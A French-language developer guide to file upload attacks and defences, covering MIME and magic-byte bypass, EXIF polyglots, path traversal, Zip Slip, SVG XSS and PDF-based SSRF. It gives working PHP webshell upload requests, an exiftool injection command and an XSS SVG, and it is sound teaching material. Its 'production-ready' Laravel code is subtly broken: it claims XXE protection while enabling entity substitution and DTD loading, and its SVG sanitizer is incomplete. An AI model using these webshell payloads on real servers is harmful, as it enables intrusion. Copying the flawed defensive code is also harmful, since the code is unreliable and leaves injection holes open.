---
title: "Attaques avancées par envoi de fichiers : techniques de contournement et défenses sécurisées"
description: "Un guide complet pour les développeurs sur les vulnérabilités liées à l'envoi de fichiers, comprenant le contournement de MIME, les fichiers polyglottes, le Zip Slip, le XSS via SVG, l'SSRF via PDF et les implémentations Laravel sécurisées."
published: 2026-07-09
faq:
  - question: "Pourquoi la vérification du type MIME par le client est-elle risquée ?"
    answer: "Les vérifications du type MIME côté client et l'en-tête HTTP Content-Type sont entièrement contrôlés par le client. Les attaquants peuvent intercepter la requête avec un proxy (comme Burp Suite) et modifier l'en-tête (par exemple, changer 'application/x-php' en 'image/png') pour contourner les filtres simples du backend."
  - question: "Qu'est-ce qu'une image polyglotte et comment exécute-t-elle du code ?"
    answer: "Une image polyglotte est un fichier valide dans plusieurs formats à la fois (par exemple, une image valide et un script PHP fonctionnel). Le code est intégré dans les métadonnées ou les commentaires de l'image. Si le serveur l'enregistre dans la racine web avec une extension .php, le code est exécuté."
  - question: "Comment puis-je empêcher le XSS via des fichiers SVG ?"
    answer: "Les fichiers SVG sont des documents XML et peuvent contenir du JavaScript intégré. Pour éviter le XSS, vous devez assainir le SVG (supprimer les balises script et les gestionnaires d'événements), convertir le SVG en format matriciel (comme PNG/JPEG) lors du téléversement, ou le servir avec l'en-tête 'Content-Disposition: attachment'."
---

# Attaques avancées par envoi de fichiers : techniques de contournement et défenses sécurisées

La fonctionnalité d'envoi (upload) de fichiers est une caractéristique standard des applications web modernes. Cependant, c'est également l'un des vecteurs d'attaque les plus critiques. Si elle n'est pas correctement sécurisée, elle peut entraîner l'exécution de code à distance (RCE), la divulgation de fichiers locaux (LFD), la contrefaçon de requête côté serveur (SSRF) et le cross-site scripting (XSS).

Ce guide explore les techniques avancées de contournement des filtres d'envoi et explique comment implémenter des mesures de sécurité robustes côté serveur en PHP et Laravel.

---

## 1. Contournement de la vérification du type MIME (MIME-Type Check Bypass)

### La vulnérabilité
Les applications web vérifient souvent l'en-tête `Content-Type` envoyé par le navigateur du client pour déterminer si un fichier est sûr. Par exemple, si vous téléversez une image, le navigateur envoie automatiquement :

```http
Content-Type: image/png
```

Si le backend de l'application ne valide que cet en-tête, cela crée une grave faille de sécurité.

### L'attaque
Un attaquant intercepte la requête de téléversement à l'aide d'un outil de proxy comme Burp Suite. Il téléverse un webshell PHP malveillant (`shell.php`) mais modifie l'en-tête `Content-Type` :

```http
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```

Puisque le serveur lit l'en-tête modifié et pense qu'il s'agit d'un fichier PNG inoffensif, il autorise le téléversement. Une fois stocké dans un répertoire accessible en ligne, l'attaquant accède à `http://vulnerable-app.com/uploads/shell.php?cmd=id` pour exécuter des commandes sur le système d'exploitation.

---

## 2. Manipulation des Magic Bytes et signatures de fichiers

### La vulnérabilité
Pour lutter contre les simples contournements de type MIME, les développeurs mettent souvent en œuvre une analyse des signatures de fichiers. Chaque format de fichier commence par une séquence unique d'octets initiaux, appelés "magic bytes". Par exemple :
- **GIF**: `GIF89a` (`47 49 46 38 39 61`)
- **PNG**: `\x89PNG\r\n\x1a\n` (`89 50 4E 47 0D 0A 1A 0A`)
- **JPEG**: `\xFF\xD8\xFF` (`FF D8 FF`)

Si le serveur ne vérifie que ces octets de signature au début du fichier, il reste vulnérable.

### L'attaque
Un attaquant ajoute la signature de fichier autorisée au début de son code malveillant. Par exemple, il crée un fichier texte commençant par `GIF89a;`, suivi du code PHP :

```http
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Disposition: form-data; name="file"; filename="shell.gif.php"
Content-Type: image/gif

GIF89a;
<?php system($_GET['cmd']); ?>
```

Lorsque le backend lit les premiers octets, il détecte la signature `GIF89a` et valide le fichier comme étant une image. Si le fichier est enregistré avec une extension `.php`, le serveur web exécutera la charge utile.

---

## 3. Injection de métadonnées EXIF et fichiers polyglottes

### La vulnérabilité
Un fichier polyglotte est un fichier valide sous plusieurs formats différents à la fois (par exemple, à la fois une image valide et un script exécutable). Les validateurs d'upload avancés utilisent des analyseurs approfondis (tels que la bibliothèque GD ou ImageMagick) pour vérifier la structure de l'image. Néanmoins, les formats d'image permettent d'inclure des commentaires textuels ou des métadonnées (comme les balises EXIF dans JPEG, ou les blocs de texte dans PNG).

### L'attaque
En utilisant des outils comme `exiftool`, les attaquants peuvent injecter du code PHP dans le commentaire ou les métadonnées d'une image sans altérer sa structure :

```bash
exiftool -Comment="<?php system($_GET['cmd']); ?>" exploit.jpg
```

Si le backend vérifie uniquement si l'image est valide (par exemple en utilisant `getimagesize()` en PHP) et enregistre le fichier avec une extension `.php` (ou s'appuie sur une double extension / un octet nul), le parseur PHP exécutera le code masqué dans les métadonnées.

> [!WARNING]
> **Survie au redimensionnement et à la compression GD/ImageMagick** : Le simple fait de redimensionner l'image sur le serveur ne garantit pas la sécurité. Les attaquants ont mis au point des fichiers polyglottes spéciaux "GD-proof" (en particulier pour PNG et JPEG) où la charge utile est placée dans des zones de données de l'image (comme le bloc PLTE ou les tables de quantification) qui survivent intactes à la compression et au redimensionnement.

---

## 4. Traversée de répertoire via le nom du fichier (Path Traversal)

### La vulnérabilité
Lors de l'envoi de fichiers, le navigateur transmet un en-tête `Content-Disposition` contenant le nom d'origine du fichier. Si le backend fait confiance à ce nom de fichier et le concatène directement avec le chemin du répertoire d'upload, une vulnérabilité de traversée de chemin se produit.

### L'attaque
Un attaquant modifie le paramètre `filename` pour y insérer des séquences de traversée de répertoire (`../`) :

```http
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```

Si le répertoire de destination est configuré sur `/var/www/html/storage/uploads/` et que l'application résout le chemin de manière dynamique sans filtrage, le fichier sera écrit dans `/var/www/html/shell.php` au lieu du dossier prévu. Cela permet à l'attaquant d'exécuter son webshell directement depuis la racine web.

---

## 5. Zip Slip (Traversée de répertoire dans les archives)

### La vulnérabilité
Lorsque les applications web acceptent des archives compressées (par exemple `.zip` ou `.tar`), le backend doit les extraire. Si la routine de décompression ne valide pas le chemin de chaque fichier au sein de l'archive, le système est vulnérable à l'attaque "Zip Slip".

### L'attaque
L'attaquant crée une archive contenant des fichiers dont le nom comprend des séquences de traversée de chemin :

```text
Archive malveillante :
└── ../../../../var/www/html/shell.php
```

Si le backend utilise des bibliothèques de décompression standards sans valider le chemin canonique de destination de chaque élément, le webshell sera extrait directement dans la racine web du serveur.

---

## 6. XSS côté client via des SVG téléversés

### La vulnérabilité
Le format SVG (Scalable Vector Graphics) est basé sur le langage XML. Comme les fichiers SVG sont des documents XML, ils peuvent contenir des scripts intégrés (balises `<script>`) et des gestionnaires d'événements HTML.

### L'attaque
Si l'application autorise l'envoi de SVG (par exemple comme photo de profil) et les sert avec l'en-tête `Content-Type: image/svg+xml`, le navigateur du visiteur les traitera comme des documents HTML actifs.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="red" />
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

Lors de l'accès direct au fichier SVG, le code JavaScript intégré s'exécutera dans le contexte du domaine de l'application, entraînant un vol de session ou le piratage d'informations d'identification.

---

## 7. SSRF & LFD via le traitement de fichiers PDF

### La vulnérabilité
Les sites web traitent souvent les fichiers PDF téléversés pour générer des miniatures (thumbnails) ou analyser le contenu textuel. Des utilitaires comme Ghostscript, `pdftoppm` ou des convertisseurs PDF-vers-HTML sont couramment utilisés. Beaucoup de ces outils ont un historique de vulnérabilités critiques (telles que l'exécution de commandes dans Ghostscript).

### L'attaque
1. **Divulgation de fichiers locaux (LFD)** : Un attaquant envoie un PDF contenant des références à des ressources locales (comme `/etc/passwd` ou `C:\Windows\win.ini`). Lors du rendu de la miniature, l'outil lit ces fichiers et en insère le texte directement dans l'image de prévisualisation.
2. **Contrefaçon de requête côté serveur (SSRF)** : Un attaquant injecte des URL internes (par exemple `http://169.254.169.254/` ou des panneaux d'administration internes) dans la structure du PDF. Lors de la tentative de traitement, le serveur enverra des requêtes vers ces réseaux locaux privés.

---

## 8. Exemple d'implémentation sécurisée en PHP/Laravel (Défense en profondeur)

Pour sécuriser l'envoi de fichiers, il est indispensable de mettre en œuvre une stratégie de défense multicouche. Une simple validation de type ou d'extension ne suffit pas.

### Contrôleur de téléversement sécurisé dans Laravel

Voici une implémentation complète et prête pour la production d'un contrôleur sécurisé dans Laravel.

```php
<?php

namespace App\Http\Controllers;

use App\Http\Requests\SecureUploadRequest;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Storage;
use Intervention\Image\Facades\Image;
use Symfony\Component\HttpFoundation\File\Exception\FileException;

class SecureUploadController extends Controller
{
    /**
     * Gère l'envoi sécurisé, la validation et le traitement des images.
     */
    public function upload(SecureUploadRequest $request)
    {
        if (!$request->hasFile('uploaded_file')) {
            return response()->json(['error' => 'Aucun fichier envoyé.'], 400);
        }

        $file = $request->file('uploaded_file');

        // 1. Appliquer une liste blanche d'extensions stricte
        $extension = strtolower($file->getClientOriginalExtension());
        $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'svg'];
        
        if (!in_array($extension, $allowedExtensions)) {
            return response()->json(['error' => 'Extension de fichier invalide.'], 400);
        }

        // 2. Déterminer le véritable type MIME côté serveur (avec fileinfo)
        $realMime = $file->getMimeType();
        $mimeToExtensionMap = [
            'image/jpeg'    => ['jpg', 'jpeg'],
            'image/png'     => ['png'],
            'image/gif'     => ['gif'],
            'image/svg+xml' => ['svg'],
        ];

        if (!isset($mimeToExtensionMap[$realMime]) || !in_array($extension, $mimeToExtensionMap[$realMime])) {
            return response()->json(['error' => 'Incohérence du type MIME.'], 400);
        }

        // 3. Générer un nom de fichier UUID aléatoire (protection contre le Path Traversal et les fuites de métadonnées)
        $uuid = Str::uuid()->toString();
        $secureFilename = "{$uuid}.{$extension}";

        // 4. Traiter séparément les fichiers SVG (Assainissement contre XSS et XXE)
        if ($realMime === 'image/svg+xml') {
            try {
                $sanitizedSvg = $this->sanitizeSvg($file->getRealPath());
                
                // Enregistrer dans un compartiment isolé (par ex. AWS S3) en dehors de la racine web
                Storage::disk('s3')->put("uploads/{$secureFilename}", $sanitizedSvg, [
                    'visibility' => 'private',
                    'ContentType' => 'image/svg+xml',
                    'ContentDisposition' => 'attachment; filename="' . $secureFilename . '"' // Force le téléchargement pour bloquer l'exécution de scripts
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'L\'assainissement du SVG a échoué.'], 400);
            }
        } else {
            // 5. Ré-encoder les images matricielles (JPEG/PNG/GIF) pour supprimer les métadonnées EXIF et détruire les polyglottes
            try {
                // Initialiser Intervention Image (utilise GD ou ImageMagick)
                $img = Image::make($file->getRealPath());

                // Reconstruire l'image recrée la structure de pixels et supprime EXIF et payloads PHP
                $stream = $img->stream($extension, 85); // Recodage avec 85% de qualité

                // Stocker sur un espace privé protégé
                Storage::disk('s3')->put("uploads/{$secureFilename}", $stream->__toString(), [
                    'visibility' => 'private',
                    'ContentType' => $realMime,
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'Le traitement de l\'image a échoué.'], 500);
            }
        }

        return response()->json([
            'message' => 'Fichier envoyé de manière sécurisée.',
            'file_id' => $uuid,
            'filename' => $secureFilename
        ], 200);
    }

    /**
     * Assainit le contenu SVG en supprimant les balises de script et les événements inline.
     */
    private function sanitizeSvg(string $filePath): string
    {
        $xml = file_get_contents($filePath);
        if ($xml === false) {
            throw new \Exception('Impossible de lire le fichier SVG.');
        }

        $dom = new \DOMDocument();
        
        // Désactiver le chargement d'entités XML externes (protection XXE)
        libxml_use_internal_errors(true);
        libxml_disable_entity_loader(true);

        if (!$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD)) {
            libxml_clear_errors();
            throw new \Exception('Structure XML invalide.');
        }

        // 1. Supprimer toutes les balises <script>
        $scripts = $dom->getElementsByTagName('script');
        while ($scripts->length > 0) {
            $script = $scripts->item(0);
            $script->parentNode->removeChild($script);
        }

        // 2. Supprimer tous les gestionnaires d'événements inline (ex. onload, onclick)
        $xpath = new \DOMXPath($dom);
        $nodes = $xpath->query('//@*[starts-with(name(), "on")]');
        foreach ($nodes as $node) {
            $node->ownerElement->removeAttributeNode($node);
        }

        $sanitizedXml = $dom->saveXML();
        libxml_clear_errors();

        return $sanitizedXml;
    }
}
```

### Durcissement de la configuration du serveur web
En plus du code sécurisé de l'application, configurez votre serveur web pour empêcher l'exécution de fichiers dans les répertoires d'upload.

#### Pour Nginx
Désactiver l'exécution PHP dans le répertoire d'upload :
```nginx
location ~* ^/storage/uploads/.*\.php$ {
    deny all;
    return 404;
}
```

#### Pour Apache
Désactiver l'affichage des index et l'exécution de PHP dans le dossier via un fichier `.htaccess` :
```apache
Options -Indexes
RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .php8
RemoveType .php .phtml .php3 .php4 .php5 .php7 .php8
php_flag engine off
```
